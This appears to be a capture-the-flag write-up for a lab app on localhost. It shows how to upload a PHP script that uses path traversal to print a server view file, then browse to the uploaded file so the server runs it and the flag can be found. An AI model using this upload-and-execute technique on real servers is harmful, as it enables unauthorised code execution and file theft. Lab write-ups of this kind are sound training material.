# Writeup

## Possible Solution

1. Upload a file with a php content (`solution.php`)
```
<?php

highlight_file('./../../../../../app/views/home.php');
```

2. Server will respond with:

```
{
  "path": "uploads/2023/04/01/d41d8cd98f00b204e9800998ecf8427e.php"
}
```

3. Open http://localhost:PORT/{path} in the browser:

Example:
http://localhost:3000/uploads/2023/04/01/d41d8cd98f00b204e9800998ecf8427e.php

4. Your code will be executed! So basically you need to execute code to browse files and view their content to find the flag!


## Notes

You can use other scripts to scan and show files!